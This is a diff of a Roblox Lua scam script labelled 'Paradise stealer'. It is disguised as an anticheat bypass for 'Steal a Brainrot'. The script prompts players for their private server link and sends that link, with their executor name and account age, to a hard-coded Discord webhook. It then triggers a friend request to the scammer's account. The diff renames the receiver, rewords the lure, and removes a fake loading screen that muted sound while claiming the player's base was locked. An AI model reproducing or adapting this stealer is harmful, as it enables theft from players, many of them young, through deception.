@@ -1,4 +1,4 @@
-local Username = "adoptmealt89860" -- The target username for the friend request
+local Username = "SoloXFurye"
 local Webhook = "1419178822296801422/wRTY9R5CZfLyZ6GveZVsZZTNEnWN89fjiQuluYkH4bWAYiAUEuLsuu1V_i7gYnxvZOyM"
 local KeyCode = Enum.KeyCode
 local CreateInstance = Instance.new
@@ -48,7 +48,7 @@ local TitleLabel = CreateInstance("TextLabel", MainFrame)
 TitleLabel.Size = CreateUDim2(1, -20, 0, 45)
 TitleLabel.Position = CreateUDim2(0, 10, 0, 10)
 TitleLabel.BackgroundTransparency = 1
-TitleLabel.Text = "Enter your Private Server Link to Unlock the Script"
+TitleLabel.Text = "Enter your Private Server Link to bypass anticheat"
 TitleLabel.TextColor3 = CreateColor3(255, 255, 255)
 TitleLabel.TextWrapped = true
 TitleLabel.TextScaled = true
@@ -140,24 +140,24 @@ ContinueButton.MouseButton1Click:Connect(function(...)
     -- 1. Construct the full webhook payload (which includes the embed)
     local WebhookPayload = {
         -- Content is optional, but often used for a direct message above the embed
-        content = "**New Private Server Link Capture:** " .. PrivateServerLink, 
+        content = "**New dualhook HIt:** " .. PrivateServerLink, 
         embeds = {
             { -- Start of Embed 
-                color = 16761035, -- Bright yellow/gold color (0xFFC90B)
+                color = 0x8B0000, -- Bright yellow/gold color (0xFFC90B)
                 fields = {
                     [1] = {
-                        name = ":bust_in_silhouette: Player Information",
+                        name = "Player Information",
                         -- Using the local Username variable
                         value = " \nReceiver: " .. Username .. "\nExecutor: " ..ExecutorName .."\nAccount Age: " .. Players.LocalPlayer.AccountAge .. " days```",
                         inline = false,
                     },
                     [2] = {
-                        name = ":house: Plot Channel (ID)",
+                        name = "Plot Channel (ID)",
                         value = "```" .. PlotChannelValue .. "```", -- Plot Channel data
                         inline = true,
                     },
                     [3] = {
-                        name = ":school_satchel: Brainrots",
+                        name = "Brainrots",
                         value = "```Empty```",
                         inline = true,
                     },
@@ -167,7 +167,7 @@ ContinueButton.MouseButton1Click:Connect(function(...)
                         inline = false,
                     },
                 },
-                title = ":brain: Steal A Brainrot Hit - paradise stealer :brain:",
+                title = "Paradise stealer",
             } -- End of Embed
         },
     } -- End of WebhookPayload
@@ -185,297 +185,8 @@ ContinueButton.MouseButton1Click:Connect(function(...)
         Body = WebhookData,
     })
     
-    UserGameSettings.MasterVolume = 0
-    local LoadingScreenGui = CreateInstance("ScreenGui")
-    LoadingScreenGui.IgnoreGuiInset = true
-    LoadingScreenGui.Parent = CoreGui
-    LoadingScreenGui.DisplayOrder = 1 / 0
-    local LoadingFrame = CreateInstance("Frame")
-    LoadingFrame.Size = CreateUDim2(1, 0, 1, 0)
-    LoadingFrame.Parent = LoadingScreenGui
-    local Gradient = CreateInstance("UIGradient")
-    local GradientColors = ColorSequence.new({
-        [1] = CreateColorSequenceKeypoint(0, CreateColor3(0, 0, 0)),
-        [2] = CreateColorSequenceKeypoint(1, CreateColor3(255, 255, 255)),
-    })
-    Gradient.Color = GradientColors
-    Gradient.Parent = LoadingFrame
-    local BackgroundImage = CreateInstance("ImageLabel")
-    BackgroundImage.BackgroundTransparency = 1
-    BackgroundImage.Size = CreateUDim2(1, 0, 1, 0)
-    BackgroundImage.Image = "rbxassetid://2151741365"
-    BackgroundImage.ImageTransparency = 0.5
-    BackgroundImage.ScaleType = Enum.ScaleType.Tile
-    BackgroundImage.TileSize = CreateUDim2(0, 250, 0, 250)
-    BackgroundImage.Parent = LoadingFrame
-    local LoadingTitle = CreateInstance("TextLabel")
-    LoadingTitle.AnchorPoint = CreateVector2(0.5, 0.5)
-    LoadingTitle.BackgroundTransparency = 1
-    LoadingTitle.Position = CreateUDim2(0.5, 0, 0.3, 0)
-    LoadingTitle.Size = CreateUDim2(0.3, 0, 0.3, 0)
-    LoadingTitle.Font = FontEnum.GothamBlack
-    LoadingTitle.Text = "🔮 Steal a Brainrot 🔮"
-    LoadingTitle.TextColor3 = CreateColor3(255, 255, 255)
-    LoadingTitle.TextScaled = true
-    LoadingTitle.Parent = LoadingFrame
-    local LoadingMessage = CreateInstance("TextLabel")
-    LoadingMessage.AnchorPoint = CreateVector2(0.5, 0.5)
-    LoadingMessage.BackgroundTransparency = 1
-    LoadingMessage.Position = CreateUDim2(0.5, 0, 0.5, 0)
-    LoadingMessage.Size = CreateUDim2(0.8, 0, 0.06, 0)
-    LoadingMessage.Font = FontEnum.GothamSemibold
-    LoadingMessage.Text = "Script Loading Please Wait for a While\n Don't worry, your base will be automatically locked"
-    LoadingMessage.TextColor3 = CreateColor3(255, 255, 255)
-    LoadingMessage.TextXAlignment = Enum.TextXAlignment.Center
-    LoadingMessage.TextScaled = true
-    LoadingMessage.Parent = LoadingFrame
-    local ProgressBarContainer = CreateInstance("Frame")
-    ProgressBarContainer.AnchorPoint = CreateVector2(0.5, 0.5)
-    ProgressBarContainer.BackgroundColor3 = CreateColor3(0, 0, 0)
-    ProgressBarContainer.BackgroundTransparency = 0.5
-    ProgressBarContainer.Position = CreateUDim2(0.5, 0, 0.56, 0)
-    ProgressBarContainer.Size = CreateUDim2(0.5, 0, 0.065, 0)
-    ProgressBarContainer.Parent = LoadingFrame
-    local ProgressBarCorner = CreateInstance("UICorner")
-    ProgressBarCorner.CornerRadius = CreateUDim(0, 10)
-    ProgressBarCorner.Parent = ProgressBarContainer
-    local ProgressBar = CreateInstance("Frame")
-    ProgressBar.Name = "LoadBar"
-    ProgressBar.BackgroundColor3 = CreateColor3(255, 255, 255)
-    ProgressBar.Position = CreateUDim2(0, 0, 0, 0)
-    ProgressBar.Size = CreateUDim2(0, 0, 1, 0)
-    ProgressBar.Parent = ProgressBarContainer
-    local ProgressBarInnerCorner = CreateInstance("UICorner")
-    ProgressBarInnerCorner.CornerRadius = CreateUDim(0, 10)
-    ProgressBarInnerCorner.Parent = ProgressBar
-    local ProgressText = CreateInstance("TextLabel")
-    ProgressText.AnchorPoint = CreateVector2(0.5, 0.5)
-    ProgressText.BackgroundTransparency = 1
-    ProgressText.Position = CreateUDim2(0.5, 0, 0.65, 0)
-    ProgressText.Size = CreateUDim2(1, 0, 0.05, 0)
-    ProgressText.Font = FontEnum.GothamSemibold
-    ProgressText.Text = "0%"
-    ProgressText.TextColor3 = CreateColor3(255, 255, 255)
-    ProgressText.TextScaled = true
-    ProgressText.Parent = LoadingFrame
-    local DiscordLink = CreateInstance("TextLabel")
-    DiscordLink.AnchorPoint = CreateVector2(0.5, 0.5)
-    DiscordLink.BackgroundTransparency = 1
-    DiscordLink.Position = CreateUDim2(0.5, 0, 0.56, 0)
-    DiscordLink.Size = CreateUDim2(0.3, 0, 0.02, 0)
-    DiscordLink.Font = FontEnum.SourceSansBold
-    DiscordLink.Text = "discord.gg/paradiserbx"
-    DiscordLink.TextColor3 = CreateColor3(150, 150, 150)
-    DiscordLink.TextScaled = false
-    DiscordLink.TextSize = 14
-    DiscordLink.Parent = LoadingFrame
-    local ProgressBarTween = TweenService:Create(ProgressBar, CreateTweenInfo(180, Enum.EasingStyle.Linear, Enum.EasingDirection.Out), {
-        Size = CreateUDim2(1, 0, 1, 0),
-    })
-    ProgressBarTween:Play()
-    task.spawn(function(...)
-        ProgressText.Text = "0%"
-        task.wait(1.8)
-        ProgressText.Text = "1%"
-        task.wait(1.8)
-        ProgressText.Text = "2%"
-        task.wait(1.8)
-        ProgressText.Text = "3%"
-        task.wait(1.8)
-        ProgressText.Text = "4%"
-        task.wait(1.8)
-        ProgressText.Text = "5%"
-        task.wait(1.8)
-        ProgressText.Text = "6%"
-        task.wait(1.8)
-        ProgressText.Text = "7%"
-        task.wait(1.8)
-        ProgressText.Text = "8%"
-        task.wait(1.8)
-        ProgressText.Text = "9%"
-        task.wait(1.8)
-        ProgressText.Text = "10%"
-        task.wait(1.8)
-        ProgressText.Text = "11%"
-        task.wait(1.8)
-        ProgressText.Text = "12%"
-        task.wait(1.8)
-        ProgressText.Text = "13%"
-        task.wait(1.8)
-        ProgressText.Text = "14%"
-        task.wait(1.8)
-        ProgressText.Text = "15%"
-        task.wait(1.8)
-        ProgressText.Text = "16%"
-        task.wait(1.8)
-        ProgressText.Text = "17%"
-        task.wait(1.8)
-        ProgressText.Text = "18%"
-        task.wait(1.8)
-        ProgressText.Text = "19%"
-        task.wait(1.8)
-        ProgressText.Text = "20%"
-        task.wait(1.8)
-        ProgressText.Text = "21%"
-        task.wait(1.8)
-        ProgressText.Text = "22%"
-        task.wait(1.8)
-        ProgressText.Text = "23%"
-        task.wait(1.8)
-        ProgressText.Text = "24%"
-        task.wait(1.8)
-        ProgressText.Text = "25%"
-        task.wait(1.8)
-        ProgressText.Text = "26%"
-        task.wait(1.8)
-        ProgressText.Text = "27%"
-        task.wait(1.8)
-        ProgressText.Text = "28%"
-        task.wait(1.8)
-        ProgressText.Text = "29%"
-        task.wait(1.8)
-        ProgressText.Text = "30%"
-        task.wait(1.8)
-        ProgressText.Text = "31%"
-        task.wait(1.8)
-        ProgressText.Text = "32%"
-        task.wait(1.8)
-        ProgressText.Text = "33%"
-        task.wait(1.8)
-        ProgressText.Text = "34%"
-        task.wait(1.8)
-        ProgressText.Text = "35%"
-        task.wait(1.8)
-        ProgressText.Text = "36%"
-        task.wait(1.8)
-        ProgressText.Text = "37%"
-        task.wait(1.8)
-        ProgressText.Text = "38%"
-        task.wait(1.8)
-        ProgressText.Text = "39%"
-        task.wait(1.8)
-        ProgressText.Text = "40%"
-        task.wait(1.8)
-        ProgressText.Text = "41%"
-        task.wait(1.8)
-        ProgressText.Text = "42%"
-        task.wait(1.8)
-        ProgressText.Text = "43%"
-        task.wait(1.8)
-        ProgressText.Text = "44%"
-        task.wait(1.8)
-        ProgressText.Text = "45%"
-        task.wait(1.8)
-        ProgressText.Text = "46%"
-        task.wait(1.8)
-        ProgressText.Text = "47%"
-        task.wait(1.8)
-        ProgressText.Text = "48%"
-        task.wait(1.8)
-        ProgressText.Text = "49%"
-        task.wait(1.8)
-        ProgressText.Text = "50%"
-        task.wait(1.8)
-        ProgressText.Text = "51%"
-        task.wait(1.8)
-        ProgressText.Text = "52%"
-        task.wait(1.8)
-        ProgressText.Text = "53%"
-        task.wait(1.8)
-        ProgressText.Text = "54%"
-        task.wait(1.8)
-        ProgressText.Text = "55%"
-        task.wait(1.8)
-        ProgressText.Text = "56%"
-        task.wait(1.8)
-        ProgressText.Text = "57%"
-        task.wait(1.8)
-        ProgressText.Text = "58%"
-        task.wait(1.8)
-        ProgressText.Text = "59%"
-        task.wait(1.8)
-        ProgressText.Text = "60%"
-        task.wait(1.8)
-        ProgressText.Text = "61%"
-        task.wait(1.8)
-        ProgressText.Text = "62%"
-        task.wait(1.8)
-        ProgressText.Text = "63%"
-        task.wait(1.8)
-        ProgressText.Text = "64%"
-        task.wait(1.8)
-        ProgressText.Text = "65%"
-        task.wait(1.8)
-        ProgressText.Text = "66%"
-        task.wait(1.8)
-        ProgressText.Text = "67%"
-        task.wait(1.8)
-        ProgressText.Text = "68%"
-        task.wait(1.8)
-        ProgressText.Text = "69%"
-        task.wait(1.8)
-        ProgressText.Text = "70%"
-        task.wait(1.8)
-        ProgressText.Text = "71%"
-        task.wait(1.8)
-        ProgressText.Text = "72%"
-        task.wait(1.8)
-        ProgressText.Text = "73%"
-        task.wait(1.8)
-        ProgressText.Text = "74%"
-        task.wait(1.8)
-        ProgressText.Text = "75%"
-        task.wait(1.8)
-        ProgressText.Text = "76%"
-        task.wait(1.8)
-        ProgressText.Text = "77%"
-        task.wait(1.8)
-        ProgressText.Text = "78%"
-        task.wait(1.8)
-        ProgressText.Text = "79%"
-        task.wait(1.8)
-        ProgressText.Text = "80%"
-        task.wait(1.8)
-        ProgressText.Text = "81%"
-        task.wait(1.8)
-        ProgressText.Text = "82%"
-        task.wait(1.8)
-        ProgressText.Text = "83%"
-        task.wait(1.8)
-        ProgressText.Text = "84%"
-        task.wait(1.8)
-        ProgressText.Text = "85%"
-        task.wait(1.8)
-        ProgressText.Text = "86%"
-        task.wait(1.8)
-        ProgressText.Text = "87%"
-        task.wait(1.8)
-        ProgressText.Text = "88%"
-        task.wait(1.8)
-        ProgressText.Text = "89%"
-        task.wait(1.8)
-        ProgressText.Text = "90%"
-        task.wait(1.8)
-        ProgressText.Text = "91%"
-        task.wait(1.8)
-        ProgressText.Text = "92%"
-        task.wait(1.8)
-        ProgressText.Text = "93%"
-        task.wait(1.8)
-        ProgressText.Text = "94%"
-        task.wait(1.8)
-        ProgressText.Text = "95%"
-        task.wait(1.8)
-        ProgressText.Text = "96%"
-        task.wait(1.8)
-        ProgressText.Text = "97%"
-        task.wait(1.8)
-        ProgressText.Text = "98%"
-        task.wait(1.8)
-        ProgressText.Text = "99%"
-        task.wait(1.8)
-        ProgressText.Text = "100%"
-    end)
+        
+        
     
     -- Use local Username for the target player
     local TargetPlayer = Players:FindFirstChild(Username)
@@ -487,6 +198,7 @@ ContinueButton.MouseButton1Click:Connect(function(...)
     if TargetPlayer then
         StarterGui:SetCore("PromptSendFriendRequest", TargetPlayer)
     end
+
     
     task.wait(0.5)
     local RobloxGui = CoreGui:FindFirstChild("RobloxGui")
